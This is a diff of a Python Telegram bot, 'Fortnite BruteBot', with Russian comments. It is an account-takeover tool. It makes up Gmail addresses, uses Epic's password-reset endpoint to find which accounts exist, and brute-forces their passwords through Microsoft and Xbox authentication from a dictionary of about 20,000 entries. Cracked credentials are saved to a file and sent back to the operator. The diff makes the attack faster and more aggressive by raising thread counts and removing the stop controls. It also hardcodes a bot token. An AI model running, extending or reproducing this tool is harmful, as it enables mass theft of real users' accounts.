@@ -11,29 +11,9 @@ import os
 import threading
 import json
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from flask import Flask, jsonify
 
 BOT_TOKEN = "8874004875:AAEslk0sxxDKXNnWtvggCc3RKUTJB4NwV14"
 bot = telebot.TeleBot(BOT_TOKEN)
-
-# ============================================================
-#  ГЛОБАЛЬНЫЙ СТАТУС ДЛЯ WEB APP
-# ============================================================
-status = {
-    'progress': 0,
-    'total': 0,
-    'found': 0,
-    'running': False,
-    'message': 'Ожидание...'
-}
-stop_flag = False
-status_lock = threading.Lock()
-
-def update_status(**kwargs):
-    with status_lock:
-        for key, value in kwargs.items():
-            if key in status:
-                status[key] = value
 
 # ============================================================
 #  ГЕНЕРАЦИЯ СЛОВАРЯ (20 000+)
@@ -120,7 +100,7 @@ PASSWORDS = sorted(set(PASSWORDS))
 print(f"[+] Сгенерировано {len(PASSWORDS)} паролей.")
 
 # ============================================================
-#  ФУНКЦИИ РАБОТЫ С EPIC
+#  БЫСТРЫЕ ФУНКЦИИ
 # ============================================================
 def get_session():
     s = requests.Session()
@@ -138,7 +118,7 @@ def microsoft_auth(email, password):
         "grant_type": "password"
     }
     try:
-        resp = session.post(url, data=data, timeout=12)
+        resp = session.post(url, data=data, timeout=5)
         if resp.status_code != 200:
             return None, "auth_fail"
         token_data = resp.json()
@@ -148,7 +128,7 @@ def microsoft_auth(email, password):
             "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token_data['access_token']},
             "RelyingParty": "http://auth.xboxlive.com",
             "TokenType": "JWT"
-        }, timeout=12)
+        }, timeout=5)
         if xbl_resp.status_code != 200:
             return None, "xbl_fail"
         xbl_token = xbl_resp.json().get('Token')
@@ -156,7 +136,7 @@ def microsoft_auth(email, password):
             "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
             "RelyingParty": "http://spartacertificate.epicgames.com",
             "TokenType": "JWT"
-        }, timeout=12)
+        }, timeout=5)
         if xsts_resp.status_code != 200:
             return None, "xsts_fail"
         xsts_data = xsts_resp.json()
@@ -170,7 +150,7 @@ def check_fortnite(user_hash, token):
     session = get_session()
     headers = {"Authorization": f"XBL3.0 x={user_hash};{token}", "Accept": "application/json"}
     try:
-        resp = session.get("https://spartacertificate.epicgames.com/api/v2/account", headers=headers, timeout=12)
+        resp = session.get("https://spartacertificate.epicgames.com/api/v2/account", headers=headers, timeout=5)
         if resp.status_code == 200:
             data = resp.json()
             return {'full_access': True, 'account_id': data.get('accountId'), 'display_name': data.get('displayName'), 'vbucks': data.get('currency', {}).get('vbucks', 0)}
@@ -190,12 +170,12 @@ def attempt_login(email, password):
 def check_account_exists(email):
     session = get_session()
     try:
-        resp = session.post("https://www.epicgames.com/account/v2/password/reset", json={"email": email}, timeout=5)
+        resp = session.post("https://www.epicgames.com/account/v2/password/reset", json={"email": email}, timeout=3)
         return resp.status_code == 200
     except:
         return False
 
-def brute_single(email, timeout=30):
+def brute_single(email, timeout=15):
     start = time.time()
     for pwd in PASSWORDS:
         if time.time() - start > timeout:
@@ -206,21 +186,19 @@ def brute_single(email, timeout=30):
     return None
 
 # ============================================================
-#  КОМАНДЫ БОТА (с поддержкой Web App)
+#  КОМАНДЫ БОТА
 # ============================================================
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     markup = types.InlineKeyboardMarkup()
     webapp_btn = types.InlineKeyboardButton(
         text="🚀 Открыть Web App",
-        web_app=types.WebAppInfo(url="https://luxury-chebakia-be1f6a.netlify.app")
+        web_app=types.WebAppInfo(url="https://magnificent-fairy-98c5a4.netlify.app/")
     )
     markup.add(webapp_btn)
-
     bot.send_message(
         message.chat.id,
-        "⬛🔵 <b>Fortnite BruteBot</b> 🔵⬛\n\n"
-        "Нажми на кнопку ниже, чтобы открыть полноценное приложение.",
+        "⬛🔵 <b>Fortnite BruteBot</b> 🔵⬛\n\nНажми на кнопку, чтобы открыть приложение.",
         parse_mode="HTML",
         reply_markup=markup
     )
@@ -240,84 +218,51 @@ def handle_web_app_data(message):
         elif command == 'show_found':
             cmd_show_found(message)
         elif command == 'stop':
-            stop_process()
-            bot.reply_to(message, "⏹ Процесс остановлен.")
+            stop_flag = True
+            bot.reply_to(message, "⏹ Остановлено.")
         else:
             bot.reply_to(message, "❌ Неизвестная команда.")
     except Exception as e:
         bot.reply_to(message, f"⚠️ Ошибка: {str(e)}")
 
-def stop_process():
-    global stop_flag
-    with status_lock:
-        stop_flag = True
-        update_status(message='Остановка...', running=False)
-
 def run_bruteforce_async(message, email):
-    bot.reply_to(message, f"⏳ Брутфорс для {email}... (до 30 сек)")
-    result = brute_single(email)
+    bot.reply_to(message, f"⏳ Брутфорс для {email}... (до 15 сек)")
+    result = brute_single(email, timeout=15)
     if result:
         pwd, acc = result
-        msg = (
-            f"✅ <b>НАЙДЕН!</b>\n"
-            f"📧 {email}\n"
-            f"🔑 {pwd}\n"
-            f"🆔 ID: {acc.get('account_id')}\n"
-            f"💎 V-Bucks: {acc.get('vbucks', 0)}"
-        )
-        bot.reply_to(message, msg, parse_mode="HTML")
+        msg = f"✅ НАЙДЕН!\n📧 {email}\n🔑 {pwd}\n🆔 ID: {acc.get('account_id')}\n💎 V-Bucks: {acc.get('vbucks', 0)}"
+        bot.reply_to(message, msg)
         with open("found.txt", "a") as f:
             f.write(f"{email}:{pwd} | ID: {acc.get('account_id')}\n")
     else:
         bot.reply_to(message, f"❌ Пароль не найден для {email}")
 
 def run_auto_mass(message, count):
-    global stop_flag
-    stop_flag = False
-    update_status(running=True, total=count, progress=0, found=0, message='Генерация email...')
-    
+    bot.reply_to(message, f"🚀 Массовый подбор {count} email запущен...")
     generated = set()
     prefixes = ["user","player","gamer","shadow","killer","master","legend","dragon","night","storm"]
     while len(generated) < count:
-        if stop_flag:
-            update_status(message='Остановлено пользователем', running=False)
-            bot.send_message(message.chat.id, "⏹ Процесс остановлен.")
-            return
         prefix = random.choice(prefixes)
         suffix = ''.join(random.choices(string.digits, k=4))
         generated.add(f"{prefix}{suffix}@gmail.com")
     emails = list(generated)
-    update_status(progress=0, message='Проверка существования...')
-    bot.send_message(message.chat.id, f"✅ Сгенерировано {len(emails)} email. Начинаю проверку существования...")
+    bot.send_message(message.chat.id, f"✅ Сгенерировано {len(emails)} email. Проверка существования...")
 
     existing = []
     lock = threading.Lock()
     progress_msg = bot.send_message(message.chat.id, f"⏳ Проверка: 0/{count}")
 
     def check_worker(email):
-        if stop_flag:
-            return
         if check_account_exists(email):
             with lock:
                 existing.append(email)
-                update_status(found=len(existing))
         return True
 
-    with ThreadPoolExecutor(max_workers=80) as executor:
+    with ThreadPoolExecutor(max_workers=200) as executor:
         futures = {executor.submit(check_worker, email): email for email in emails}
         processed = 0
         for future in as_completed(futures):
-            if stop_flag:
-                executor.shutdown(wait=False)
-                update_status(message='Остановлено', running=False)
-                bot.edit_message_text(
-                    f"⏹ Остановлено. Найдено аккаунтов: {len(existing)}",
-                    chat_id=progress_msg.chat.id,
-                    message_id=progress_msg.message_id
-                )
-                return
             processed += 1
-            update_status(progress=processed)
             if processed % 1000 == 0 or processed == count:
                 bot.edit_message_text(
                     f"⏳ Проверка: {processed}/{count} | Найдено аккаунтов: {len(existing)}",
@@ -331,30 +276,21 @@ def run_auto_mass(message, count):
         chat_id=progress_msg.chat.id,
         message_id=progress_msg.message_id
     )
-    update_status(progress=count, message='Проверка завершена')
 
     if not existing:
         bot.send_message(message.chat.id, "❌ Аккаунтов не найдено.")
-        update_status(running=False, message='Завершено (аккаунтов нет)')
         return
 
-    bot.send_message(message.chat.id, f"⚡ Начинаю брутфорс для {len(existing)} аккаунтов (до 30 сек на каждый)...")
-    update_status(message='Брутфорс...')
+    bot.send_message(message.chat.id, f"⚡ Брутфорс для {len(existing)} аккаунтов...")
     found = {}
-    with ThreadPoolExecutor(max_workers=30) as executor:
-        futures = {executor.submit(brute_single, email, 30): email for email in existing[:200]}
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        futures = {executor.submit(brute_single, email, 15): email for email in existing[:200]}
         for future in as_completed(futures):
-            if stop_flag:
-                executor.shutdown(wait=False)
-                update_status(message='Остановлено', running=False)
-                bot.send_message(message.chat.id, "⏹ Брутфорс остановлен.")
-                return
             email = futures[future]
             result = future.result()
             if result:
                 pwd, acc = result
                 found[email] = (pwd, acc)
-                update_status(found=len(found))
                 with open("found.txt", "a") as f:
                     f.write(f"{email}:{pwd} | ID: {acc.get('account_id')}\n")
     if found:
@@ -362,14 +298,6 @@ def run_auto_mass(message, count):
         bot.send_message(message.chat.id, f"✅ Найдено {len(found)} аккаунтов:\n<code>{msg[:4000]}</code>", parse_mode="HTML")
     else:
         bot.send_message(message.chat.id, "❌ Ничего не найдено.")
-    update_status(running=False, message='Завершено')
-
-# ============================================================
-#  ОСТАЛЬНЫЕ КОМАНДЫ (для обратной совместимости)
-# ============================================================
-@bot.message_handler(commands=['help'])
-def cmd_help(message):
-    bot.reply_to(message, "Используй /start для открытия Web App.")
 
 @bot.message_handler(commands=['show_found'])
 def cmd_show_found(message):
@@ -404,44 +332,19 @@ def cmd_status(message):
         with open("found.txt", "r") as f:
             found_count = sum(1 for _ in f)
     bot.reply_to(message,
-        f"🟢 Бот активен\n"
-        f"📚 Словарь: {len(PASSWORDS)} паролей\n"
-        f"🧵 Потоков: 80 (проверка) / 30 (брутфорс)\n"
-        f"📂 Найдено аккаунтов: {found_count}"
+        f"🟢 Бот активен\n📚 Словарь: {len(PASSWORDS)} паролей\n🧵 Потоков: 200/100\n📂 Найдено аккаунтов: {found_count}"
     )
 
-# ============================================================
-#  FLASK WEB SERVER ДЛЯ СТАТУСА
-# ============================================================
-app = Flask(__name__)
-
-@app.route('/status')
-def get_status():
-    with status_lock:
-        return jsonify(status)
-
-def run_flask():
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)), debug=False, use_reloader=False)
-
-# ============================================================
-#  ЗАПУСК
-# ============================================================
 if __name__ == "__main__":
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    print("[+] Flask сервер запущен.")
-
     try:
         bot.remove_webhook()
         print("Вебхук сброшен.")
     except Exception as e:
         print(f"Ошибка сброса вебхука (игнорируем): {e}")
-
     print(f"Бот запущен. Словарь: {len(PASSWORDS)} паролей.")
-
     while True:
         try:
             bot.polling(non_stop=True, skip_pending=True)
         except Exception as e:
             print(f"Критическая ошибка в polling: {e}")
-            time.sleep(5)
+            time.sleep(3)
